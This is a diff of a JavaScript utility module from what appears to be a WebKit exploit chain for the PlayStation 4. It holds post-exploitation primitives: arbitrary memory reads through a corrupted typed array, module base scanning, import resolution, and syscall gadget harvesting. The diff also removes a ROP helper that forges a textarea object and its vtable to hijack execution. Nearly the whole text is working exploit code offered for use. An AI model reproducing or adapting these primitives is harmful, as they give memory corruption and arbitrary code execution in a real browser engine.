@@ -17,17 +17,17 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
 // This module are for utilities that depend on running the exploit first
 
-import { Int } from './int64.mjs';
-import { Addr, mem } from './mem.mjs';
-import { align } from './utils.mjs';
-import { KB, page_size } from './offset.mjs';
-import { read32 } from './rw.mjs';
+// import { Int } from './int64.mjs';
+// import { Addr, mem } from './mem.mjs';
+// import { align } from './utils.mjs';
+// import { KB } from './constants.mjs';
+// import { read32 } from './rw.mjs';
 
-import * as rw from './rw.mjs';
-import * as o from './offset.mjs';
+// import * as rw from './rw.mjs';
+// import * as o from './offset.mjs';
 
 // creates an ArrayBuffer whose contents is copied from addr
-export function make_buffer(addr, size) {
+function make_buffer(addr, size) {
     // see enum TypedArrayMode from
     // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
     // at webkitgtk 2.34.4
@@ -35,7 +35,11 @@ export function make_buffer(addr, size) {
     // see possiblySharedBuffer() from
     // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
     // at webkitgtk 2.34.4
-
+    //
+    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
+    // associated with them, if we ask for view.buffer, the view will be
+    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
+    //
     // We will create an OversizeTypedArray via requesting an Uint8Array whose
     // number of elements will be greater than fastSizeLimit (1000).
     //
@@ -53,20 +57,15 @@ export function make_buffer(addr, size) {
     const u_addr = mem.addrof(u);
 
     // we won't change the butterfly and m_mode so we won't save those
-    const old_addr = u_addr.read64(o.view_m_vector);
-    const old_size = u_addr.read32(o.view_m_length);
+    const old_addr = u_addr.read64(view_m_vector);
+    const old_size = u_addr.read32(view_m_length);
 
-    u_addr.write64(o.view_m_vector, addr);
-    u_addr.write32(o.view_m_length, size);
+    u_addr.write64(view_m_vector, addr);
+    u_addr.write32(view_m_length, size);
 
     const copy = new Uint8Array(u.length);
     copy.set(u);
 
-    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
-    // associated with them, if we ask for view.buffer, the view will be
-    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
-    // This is done by calling slowDownAndWasteMemory().
-    //
     // We can't use slowDownAndWasteMemory() on u since that will create a
     // JSC::ArrayBufferContents with its m_data pointing to addr. On the
     // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
@@ -76,8 +75,8 @@ export function make_buffer(addr, size) {
     const res = copy.buffer;
 
     // restore
-    u_addr.write64(o.view_m_vector, old_addr);
-    u_addr.write32(o.view_m_length, old_size);
+    u_addr.write64(view_m_vector, old_addr);
+    u_addr.write32(view_m_length, old_size);
 
     return res;
 }
@@ -136,7 +135,9 @@ function check_magic_at(p, is_text) {
 // // 0 distance away from module_base_addr.
 // addr.read8(-1);
 //
-export function find_base(addr, is_text, is_back) {
+function find_base(addr, is_text, is_back) {
+    // ps4 page size
+    const page_size = 16 * KB;
     // align to page size
     addr = align(addr, page_size);
     const offset = (is_back ? -1 : 1) * page_size;
@@ -150,14 +151,14 @@ export function find_base(addr, is_text, is_back) {
 }
 
 // gets the address of the underlying buffer of a JSC::JSArrayBufferView
-export function get_view_vector(view) {
+function get_view_vector(view) {
     if (!ArrayBuffer.isView(view)) {
         throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
     }
-    return mem.addrof(view).readp(o.view_m_vector);
+    return mem.addrof(view).readp(view_m_vector);
 }
 
-export function resolve_import(import_addr) {
+function resolve_import(import_addr) {
     if (import_addr.read16(0) !== 0x25ff) {
         throw Error(
             `instruction at ${import_addr} is not of the form: jmp qword`
@@ -179,15 +180,13 @@ export function resolve_import(import_addr) {
     return function_addr;
 }
 
-export function init_syscall_array(
+function init_syscall_array(
     syscall_array,
     libkernel_web_base,
     max_search_size,
 ) {
-    if (!Number.isInteger(max_search_size)) {
-        throw TypeError(
-            `max_search_size is not a integer: ${max_search_size}`
-        );
+    if (typeof max_search_size !== 'number') {
+        throw TypeError(`max_search_size is not a number: ${max_search_size}`);
     }
     if (max_search_size < 0) {
         throw Error(`max_search_size is less than 0: ${max_search_size}`);
@@ -242,103 +241,4 @@ export function init_syscall_array(
             i += 11;
         }
     }
-}
-
-// textarea object cloned by create_ta_clone()
-const rop_ta = document.createElement('textarea');
-
-// Creates a helper object for ROP using the textarea vtable method
-//
-// Args:
-//   obj:
-//     Object to attach objects that need to stay alive in order for the clone
-//     to work.
-//
-// Returns:
-//   The address of the clone.
-export function create_ta_clone(obj) {
-    // sizeof JSC:JSObject, the JSCell + the butterfly field
-    const js_size = 0x10;
-    // start of the array of inline properties (JSValues)
-    const offset_js_inline_prop = 0x10;
-    // Sizes may vary between webkit versions so we just assume a size
-    // that we think is large enough for all of them.
-    const vtable_size = 0x1000;
-    const webcore_ta_size = 0x180;
-
-    // Empty objects have 6 inline properties that are not inspected by the
-    // GC. This gives us 48 bytes of free space that we can write with
-    // anything.
-    const ta_clone = {};
-    obj.ta_clone = ta_clone;
-    const clone_p = mem.addrof(ta_clone);
-    const ta_p = mem.addrof(rop_ta);
-
-    // Copy the contents of the textarea before copying the JSCell. As long
-    // the JSCell is of an empty object, the GC will not inspect the inline
-    // storage.
-    //
-    // MarkedBlocks serve memory in fixed-size chunks (cells). The chunk
-    // size is also called the cell size. Even if you request memory whose
-    // size is less than a cell, the entire cell is allocated for the
-    // object.
-    //
-    // The cell size of the MarkedBlock where the empty object is allocated
-    // is atleast 64 bytes (enough to fit the empty object). So even if we
-    // change the JSCell later and the perceived size of the object
-    // (size_jsta) is less than 64 bytes, we don't have to worry about the
-    // memory area between clone_p + size_jsta and clone_p + cell_size
-    // being freed and reused because the entire cell belongs to the object
-    // until it dies.
-    for (let i = js_size; i < o.size_jsta; i += 8) {
-        clone_p.write64(i, ta_p.read64(i));
-    }
-
-    // JSHTMLTextAreaElement is a subclass of JSC::JSDestructibleObject and
-    // thus they are allocated on a MarkedBlock with special attributes
-    // that tell the GC to have their destructor clean their storage on
-    // their death.
-    //
-    // The destructor in this case will destroy m_wrapped since they are a
-    // subclass of WebCore::JSDOMObject as well.
-    //
-    // What's great about the clones (initially empty objects) is that they
-    // are instances of JSC::JSFinalObject. That type doesn't have a
-    // destructor and so they are allocated on MarkedBlocks that don't need
-    // destruction.
-    //
-    // So even if a clone dies, the GC will not look for a destructor and
-    // try to run it. This means we can fake m_wrapped and not fear of any
-    // sort of destructor being called on it.
-
-    const webcore_ta = ta_p.readp(o.jsta_impl);
-    const m_wrapped_clone = new Uint8Array(
-        make_buffer(webcore_ta, webcore_ta_size)
-    );
-    obj.m_wrapped_clone = m_wrapped_clone;
-
-    // Replicate the vtable as much as possible or else the garbage
-    // collector will crash. It uses functions from the vtable.
-    const vtable_clone = new Uint8Array(
-        make_buffer(webcore_ta.readp(0), vtable_size)
-    );
-    obj.vtable_clone = vtable_clone
-
-    clone_p.write64(
-        o.jsta_impl,
-        get_view_vector(m_wrapped_clone),
-    );
-    rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
-
-    // turn the empty object into a textarea (copy JSCell header)
-    //
-    // Don't need to copy the butterfly since it's by default NULL and it
-    // doesn't have any special meaning for the JSHTMLTextAreaObject type,
-    // unlike other types that uses it for something else.
-    //
-    // An example is a JSArrayBufferView with m_mode >= WastefulTypedArray,
-    // their *(butterfly - 8) is a pointer to a JSC::ArrayBuffer.
-    clone_p.write64(0, ta_p.read64(0));
-
-    return clone_p;
 }
